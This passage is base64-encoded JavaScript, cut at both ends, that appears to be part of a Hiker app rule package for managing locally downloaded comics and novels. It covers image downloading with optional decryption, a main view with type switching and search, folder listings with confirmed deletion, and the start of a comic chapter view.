lLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChrZXkuaW5jbHVkZXMoXFxcIi5cXFwiKSB8fCBrZXkuaW5jbHVkZXMoXFxcIj9cXFwiKSkge1xcbiAgICAgICAgICAgICAgICBwaWNVcmwgKz0gXFxcIkBcXFwiICsga2V5ICsgKHZhbHVlID8gXFxcIj1cXFwiICsgdmFsdWUgOiBcXFwiXFxcIik7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChrZXkgIT09IFxcXCJqc1xcXCIpIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyc1trZXldID0gdmFsdWU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIFtwaWNVcmwsIGhlYWRlcnNdO1xcbiAgICB9LFxcbiAgICByYW5nZShzdGFydCwgZW5kKSB7XFxuICAgICAgICByZXR1cm4gQXJyYXkoZW5kIC0gc3RhcnQpLmZpbGwoMCkubWFwKChlbCwgaSkgPT4gc3RhcnQgKyBpKTtcXG4gICAgfSxcXG4gICAgcGljRG93bmxvYWQodXJsLCBwYXRoLCBoZWFkZXJzLCBkZWNpcGhlKSB7XFxuICAgICAgICBpZiAodHlwZW9mIGRlY2lwaGUgPT09IFxcXCJzdHJpbmdcXFwiICYmIGRlY2lwaGUubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgIGxldCBpbnN0cmVhbTtcXG4gICAgICAgICAgICBsZXQgb3V0c3RyZWFtO1xcbiAgICAgICAgICAgIGxldCBmaWxlO1xcbiAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgIGZpbGUgPSBuZXcgamF2YS5pby5GaWxlKHBhdGgpO1xcbiAgICAgICAgICAgICAgICBpZiAoZmlsZS5leGlzdHMoKSkge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGxldCBkaXIgPSBmaWxlLmdldFBhcmVudEZpbGUoKTtcXG4gICAgICAgICAgICAgICAgaWYgKGRpciAhPSBudWxsICYmICFkaXIuZXhpc3RzKCkpIHtcXG4gICAgICAgICAgICAgICAgICAgIGRpci5ta2RpcnMoKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpbnN0cmVhbSA9IGZldGNoKHVybCwge1xcbiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogaGVhZGVycyxcXG4gICAgICAgICAgICAgICAgICAgIGlucHV0U3RyZWFtOiB0cnVlXFxuICAgICAgICAgICAgICAgIH0pO1xcblxcbiAgICAgICAgICAgICAgICBvdXRzdHJlYW0gPSBuZXcgamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtKHBhdGgpO1xcbiAgICAgICAgICAgICAgICBsZXQgdCA9ICQuaGlrZXIuaW5wdXQsXFxuICAgICAgICAgICAgICAgICAgICBjID0gJC5oaWtlci51cmw7XFxuICAgICAgICAgICAgICAgICQuaGlrZXIuaW5wdXQgPSBpbnN0cmVhbTtcXG4gICAgICAgICAgICAgICAgJC5oaWtlci51cmwgPSB1cmw7XFxuICAgICAgICAgICAgICAgIGxldCBwaWNpbiA9IChuZXcgRnVuY3Rpb24oXFxcInJldHVybiBcXFwiICsgZGVjaXBoZSkpKCk7XFxuICAgICAgICAgICAgICAgICQuaGlrZXIuaW5wdXQgPSB0O1xcbiAgICAgICAgICAgICAgICAkLmhpa2VyLnVybCA9IGM7XFxuICAgICAgICAgICAgICAgIGxldCBidWYgPSBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQnl0ZS5UWVBFLCAxMDI0KTtcXG4gICAgICAgICAgICAgICAgbGV0IGxlbjtcXG4gICAgICAgICAgICAgICAgd2hpbGUgKChsZW4gPSBwaWNpbi5yZWFkKGJ1ZikpICE9IC0xKSB7XFxuICAgICAgICAgICAgICAgICAgICBvdXRzdHJlYW0ud3JpdGUoYnVmLCAwLCBsZW4pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGNsb3NlTWUoaW5zdHJlYW0pO1xcbiAgICAgICAgICAgICAgICBjbG9zZU1lKG91dHN0cmVhbSk7XFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgICAgICBjbG9zZU1lKGluc3RyZWFtKTtcXG4gICAgICAgICAgICAgICAgY2xvc2VNZShvdXRzdHJlYW0pO1xcbiAgICAgICAgICAgICAgICBpZiAoZmlsZSBpbnN0YW5jZW9mIGphdmEuaW8uRmlsZSAmJiBmaWxlLmV4aXN0cygpKSB7XFxuICAgICAgICAgICAgICAgICAgICBmaWxlLmRlbGV0ZSgpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGxvZyhcXFwiPOino+WvhuS4i+i9vUVycm9yPlxcXCIgKyBlLnRvU3RyaW5nKCkpXFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxuICAgICAgICAgICAgfSBmaW5hbGx5IHtcXG4gICAgICAgICAgICAgICAgY2xvc2VNZShpbnN0cmVhbSk7XFxuICAgICAgICAgICAgICAgIGNsb3NlTWUob3V0c3RyZWFtKTtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJlcXVpcmVEb3dubG9hZCh1cmwsIHBhdGgsIGhlYWRlcnMpO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB0ZXh0U2hpZWxkKHRleHQpIHtcXG4gICAgICAgIGxldCBlID0gLyN8OnwmfFxcXFx8fFxcXFxefEB8XFxcXDx8XFxcXD58JXxcXFxcL3xcXFxcP3xcXFxcJC9nO1xcbiAgICAgICAgcmV0dXJuIHRleHQucmVwbGFjZShlLCBcXFwiX1xcXCIpO1xcbiAgICB9XFxuICAgIFxcbn1cXG5cXG4kLmV4cG9ydHMgPSB2O1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3Yu5Li76aG16Z2iXCIsXCJwYXRoXCI6XCJNYWluLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmZ1bmN0aW9uIG1haW4oKSB7XFxuICAgIHZhciBsYXlvdXQgPSBbXTtcXG4gICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuICAgIGxldCB0eXBlID0gZ2V0TXlWYXIoXFxcIi50eXBlXFxcIiwgZ2V0SXRlbShcXFwibWFpbjp0eXBlXFxcIiwgQ29uZmlnLmRlZl9Mb3JkX1R5cGUpKTtcXG4gICAgbGV0IHRnbnVtID0gZ2V0TXlWYXIoXFxcIi50Z251bVxcXCIsIFxcXCIwXFxcIik7XFxuICAgIGFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoTVlfSUQpID0+IHtcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcInNlYXJjaEtleVxcXCIpO1xcbiAgICAgICAgY2xlYXJNeVZhcihcXFwiLnRnbnVtXFxcIik7XFxuICAgIH0pKTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IHR5cGUgPT09IFxcXCJjb21pY1xcXCIgPyBcXFwi4peJ5ryr55S7XFxcIiA6IFxcXCLil4vmvKvnlLtcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKCh0eXBlKSA9PiB7XFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXCJjb21pY1xcXCIpIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcIi50eXBlXFxcIiwgXFxcImNvbWljXFxcIik7XFxuICAgICAgICAgICAgc2V0SXRlbShcXFwibWFpbjp0eXBlXFxcIiwgXFxcImNvbWljXFxcIik7XFxuICAgICAgICAgICAgY2xlYXJNeVZhcihcXFwiLnRnbnVtXFxcIik7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCB0eXBlKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIixcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiB0eXBlID09PSBcXFwibm92ZWxcXFwiID8gXFxcIuKXieWwj+ivtFxcXCIgOiBcXFwi4peL5bCP6K+0XFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgodHlwZSkgPT4ge1xcbiAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwibm92ZWxcXFwiKSByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCIudHlwZVxcXCIsIFxcXCJub3ZlbFxcXCIpO1xcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcIm1haW46dHlwZVxcXCIsIFxcXCJub3ZlbFxcXCIpO1xcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcIi50Z251bVxcXCIpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgfSwgdHlwZSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfM1xcXCIsXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogdHlwZSA9PT0gXFxcInR4dFxcXCIgPyBcXFwi4peJ5pW05pys5bCP6K+0XFxcIiA6IFxcXCLil4vmlbTmnKzlsI/or7RcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKCh0eXBlKSA9PiB7XFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXCJ0eHRcXFwiKSByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9Ob3ZlbENvbGxlY3RlZC52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1xcXCI7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcIi50eXBlXFxcIiwgXFxcInR4dFxcXCIpO1xcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcIm1haW46dHlwZVxcXCIsIFxcXCJ0eHRcXFwiKTtcXG4gICAgICAgICAgICBjbGVhck15VmFyKFxcXCIudGdudW1cXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIHR5cGUpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiXFxuICAgIH0pO1xcbiAgICBpZiAodHlwZSA9PT0gXFxcInR4dFxcXCIpIHtcXG4gICAgICAgIGxldCB0eHRWaWV3ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZXh0ZXJuYWxpbXBvcnRUeHQudmlld1xcXCIpO1xcbiAgICAgICAgcmV0dXJuIHR4dFZpZXcobGF5b3V0KTtcXG4gICAgfVxcbiAgICBsZXQgdGFnID0gRmlsZS5nZXRGaWxlUGF0aChDb25maWdbdHlwZSArIFxcXCJQYXRoXFxcIl0sIFxcXCJkaXJcXFwiKTtcXG4gICAgaWYgKHRhZy5sZW5ndGggPT09IDApIHtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiLFxcbiAgICAgICAgfSk7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLorr7nva5cXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICB2ZXJzaW9uOiBNWV9SVUxFLnZlcnNpb25cXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG5cXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOW4ruWKqeKAneKAnVxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2hlbHAudmlldyNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9rZXl3b3JkPW5vdmVsQ29taWNcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICc8aDEgc3R5bGU9XFxcInRleHQtYWxpZ246IGNlbnRlcjtcXFwiPuWVpemDveayoeacieiAtjwvaDE+JyxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmV0dXJuIHNldFJlc3VsdChsYXlvdXQpO1xcbiAgICB9XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHVybDogJ1xcXCJoaWtlcjovL3NlYXJjaD9zPVxcXCIraW5wdXQnLFxcbiAgICAgICAgZGVzYzogXFxcIuaQnOS9oOaDs+imgeeahCNcXFwiICsgdHlwZSArIFxcXCIjLi4uLi4uXFxcIixcXG4gICAgICAgIHRpdGxlOiBcXFwi8J+UjVxcXCIsXFxuICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgcnVsZXM6ICQudG9TdHJpbmcoKHRhZywgdHlwZSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgYXJyMSA9IFtdO1xcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHRhZy5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICAgICAgYXJyMS5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFwidGl0bGVcXFwiOiB0YWdbaV0ubmFtZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFwic2VhcmNoX3VybFxcXCI6IFxcXCJoaWtlcjovL2VtcHR5P2lzQWxsPTEmc2VhcmNoVGVybXM9KiomdHlwZT1cXFwiICsgdHlwZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFwic2VhcmNoRmluZFxcXCI6IFxcXCJqczokLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9TZWFyY2gudmlldz9ydWxlPScrTVlfUlVMRS5fdGl0bGUpO1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShhcnIxKTtcXG4gICAgICAgICAgICB9LCB0YWcsIHR5cGUpLFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoJ3NlYXJjaEtleScsICcnKSxcXG4gICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCdzZWFyY2hLZXknLGlucHV0KVxcXCJcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuXFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi4oCY4oCY4pqZ6K6+572u4oCZ4oCZXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgdmVyc2lvbjogTVlfUlVMRS52ZXJzaW9uXFxuICAgICAgICB9XFxuICAgIH0pO1xcblxcblxcbiAgICBmb3IgKGxldCBpIGluIHRhZykge1xcbiAgICAgICAgbGV0IGl0ID0gdGFnW2ldO1xcbiAgICAgICAgaWYgKHRnbnVtID09PSBpKSB7XFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnFxcXCIgKyBpdC5uYW1lICsgXFxcIuKAneKAnVxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChbXFxcIuWIoOmZpOivpeebruW9lVxcXCIsIFxcXCLot7PovazlsI/nqIvluo9cXFwiLCBcXFwi5omT5byA5Lmm5p62XFxcIl0sIDEsIFxcXCLpgInmi6nmk43kvZxcXFwiKS5zZWxlY3QoKGl0LCB0eXBlKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoXFxcIui3s+i9rOWwj+eoi+W6j1xcXCIgPT09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2hvbWVAXFxcIiArIGl0Lm5hbWU7XFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYoXFxcIuWIoOmZpOivpeebruW9lVxcXCI9PT1pbnB1dCl7XFxuICAgICAgICAgICAgICAgICAgICAgICAgLy9yZXR1cm4gdGhlbihbXFxcIuivpeaTjeS9nOS4jeS8muWIoOmZpOWwj+eoi+W6j++8jOS9huivpeWwj+eoi+W6j+S4i+i9veeahOaJgOaciea8q+eUu+Wwhuiiq+WIoOmZpFxcXCJdKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJChcXFwi6K+l5pON5L2c5LiN5Lya5Yig6Zmk5bCP56iL5bqP77yM5L2G6K+l5bCP56iL5bqP5LiL6L2955qE5omA5pyJIOa8q+eUuy/lsI/or7Qg5bCG6KKr5Yig6ZmkXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihcXFwiLnRnbnVtXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGl0LnBhdGgpO1xcbiAgICAgICAgICAgICAgICAgICAgfWVsc2V7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvQm9va3JhY2sudmlldz9ydWxlPeacrOWcsOi1hOa6kOeuoeeQhiZydWxlTmFtZT1cXFwiK2l0Lm5hbWUrXFxcIiZ0eXBlPVxcXCIrdHlwZTtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSwgaXQsIHR5cGUpXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0Lm5hbWUsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCIudGdudW1cXFwiLCBpKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgICB9LCBpKSxcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBsZXQgcGF0aCA9IHRhZ1t0Z251bV0ucGF0aDtcXG4gICAgbGV0IG1obGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCwgXFxcImRpclxcXCIpO1xcblxcbiAgICBpZiAobWhsaXN0Lmxlbmd0aCA9PT0gMCkge1xcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCLllaXpg73msqHmnInogLZcXFwiLmJpZygpLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gc2V0UmVzdWx0KGxheW91dCk7XFxuICAgIH1cXG4gICAgbGV0IHBhZ2VVcmwgPSB0eXBlID09PSBcXFwibm92ZWxcXFwiID8gXFxcImhpa2VyOi8vcGFnZS9Ob3ZlbEJyb3dzZXIudmlld1xcXCIgOiBcXFwiaGlrZXI6Ly9wYWdlL0NvbWljQnJvd3Nlci52aWV3XFxcIjtcXG4gICAgZm9yIChsZXQgaXRlbSBvZiBtaGxpc3QpIHtcXG4gICAgICAgIGxldCBwaWMgPSBmaWxlRXhpc3QoXFxcImZpbGU6Ly9cXFwiICsgaXRlbS5wYXRoICsgXFxcIi9cXFwiICsgaXRlbS5uYW1lICsgXFxcIi5qcGdcXFwiKSA/IGl0ZW0ucGF0aCArIFxcXCIvXFxcIiArIGl0ZW0ubmFtZSArIFxcXCIuanBnXFxcIiA6IENvbmZpZy5kZWZfUGljO1xcbiAgICAgICAgbGV0IG5hbWVzPVN0cmluZyhpdGVtLm5hbWUpLnNwbGl0KFxcXCIkXFxcIik7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IG5hbWVzWzBdLFxcbiAgICAgICAgICAgIGRlc2M6IG5hbWVzWzFdLFxcbiAgICAgICAgICAgIHBpY191cmw6IHBpYyxcXG4gICAgICAgICAgICB1cmw6IHR5cGUgPT09IFxcXCJub3ZlbFxcXCIgP3BhZ2VVcmwgKyBcXFwiP3J1bGU9XFxcIiArIE1ZX1JVTEUudGl0bGU6JChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgocGFnZVVybCwgcGF0aCk9PntcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFwibG9uZ1ByZXNzLmpzXFxcIikuc2luZ2xlRW50ZXIocGFnZVVybCwgcGF0aCk7XFxuICAgICAgICAgICAgfSwgcGFnZVVybCwgaXRlbS5wYXRoKSxcXG4gICAgICAgICAgICBleHRyYTogT2JqZWN0LmFzc2lnbihpdGVtLCB7XFxuICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yig6ZmkXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChwYXRoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFwibG9uZ1ByZXNzLmpzXFxcIikuZGVsZXRlRmlsZUZvckJvb2socGF0aClcXG4gICAgICAgICAgICAgICAgICAgIH0sIGl0ZW0ucGF0aClcXG4gICAgICAgICAgICAgICAgfV0sXFxuICAgICAgICAgICAgICAgIGlkOiBpdGVtLnBhdGhcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgc2V0UmVzdWx0KGxheW91dCk7XFxufVxcblxcbm1haW4oKTtcIn0se1wiY29sX3R5cGVcIjpcInRleHRfMVwiLFwibmFtZVwiOlwiI3Yu5ryr55S756ug6IqC5YiX6KGoXCIsXCJwYXRoXCI6XCJDb21pY0Jyb3dzZXIudmlld1wiLFwicnVsZVwiOlwianM6XFxuY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiVG9vbC5qc1xcXCIpO1xcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiQ29uZmlnLmpzXFxcIik7XFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiRmlsZS5qc1xcXCIpO1xcbmlmIChnZXRQYXJhbShcXFwiaGFzUGFyYW1zXFxcIikgPT09IFxcXCJ0cnVlXFxcIikge1xcbiAgICBNWV9QQVJBTVMgPSB7XFxuICAgICAgICBwYXRoOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInBhdGhcXFwiKSksXFxuICAgICAgICBuYW1lOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcIm5hbWVcXFwiKSksXFxuICAgICAgICBib29rTmFtZTogZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJib29rTmFtZVxcXCIpKSxcXG4gICAgICAgIHJ1bGVOYW1lOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInJ1bGVOYW1lXFxcIikpLFxcbiAgICAgICAgY29taWNTdHlsZTogZ2V0UGFyYW0oXFxcImNvbWljU3R5bGVcXFwiKVxcbiAgICB9XFxufVxcbmxldCBwYXRoID0gTVlfUEFSQU1TLnBhdGg7XFxuaWYgKCFwYXRoKSB7XFxuICAgIHBhdGggPSBDb25maWcuY29taWNQYXRoICsgXFxcIi9cXFwiICsgTVlfUEFSQU1TLnJ1bGVOYW1lICsgXFxcIi9cXFwiICsgTVlfUEFSQU1TLmJvb2tOYW1lO1xcbn1cXG5pZiAoTVlfUEFSQU1TLmNvbWljU3R5bGUpIHtcXG4gICAgQ29uZmlnLmRlZl9Db21pY19TdHlsZSA9IE1ZX1BBUkFNUy5jb21pY1N0eWxlO1xcbn1cXG5zZXRQYWdlVGl0bGUoXFxcIkNWfFxcXCIgKyAoTVlfUEFSQU1TLm5hbWUgfHwgRmlsZS5nZXROYW1lKHBhdGgpKSk7XFxuXFxudmFyIGxheW91dCA9IFtdO1xcbmxldCBtb2RlID0gZ2V0TXlWYXIoXFxcIi5tb2RlXFxcIiwgXFxcIjBcXFwiKTtcXG5sZXQgaXNSZXZlcnNlID0gZ2V0TXlWYXIoXFxcIi5pc1JldmVyc2VcXFwiLCBcXFwiMFxcXCIpO1xcbmFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoKSA9PiB7XFxuICAgIGNsZWFyTXlWYXIoXFxcIi5tb2RlXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcIi5pc1JldmVyc2VcXFwiKTtcXG59KSk7XFxuY29uc3QgY29taWNTdGF0dXMgPSBuZXcgTWFwKFtcXG4gICAgW1xcXCJBXFxcIiwgXFxcIlxcXCJdLFxcbiAgICBbXFxcIkJcXFwiLCBcXFwi4oCY4oCYW+acquWujOaIkF3igJnigJlcXFwiXVxcbl0pO1xcblxcbmZ1bmN0aW9uIGdldFRpdGxlKHRpdGxlKSB7XFxuICAgIGxldCB0aXRsZXMgPSBUb29sLnNwbGl0KHRpdGxlLCBcXFwiJFxcXCIsIDIpO1xcbiAgICByZXR1cm4gY29taWNTdGF0dXMuZ2V0KHRpdGxlc1sxXSkgKyB0aXRsZXNbMl0gfHwgdGl0bGU7XFxufVxcblxcbmZ1bmN0aW9uIGdldFRpdGxlMih0aXRsZSkge1xcbiAgICBsZXQgdGl0bGVzID0gVG9vbC5zcGxpdCh0aXRsZSwgXFxcIiRcXFwiLCAyKTtcXG4gICAgcmV0dXJuIHRpdGxlc1syXSB8fCB0aXRsZTtcXG59XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuWIoOmZpOaVtOacrFxcXCIsXFxuICAgIHVybDogJChcXFwi56Gu6K6k5Yig6Zmk5pW05pys5ryr55S777yfXFxcIikuY29uZmlybSgocGF0aCkgPT4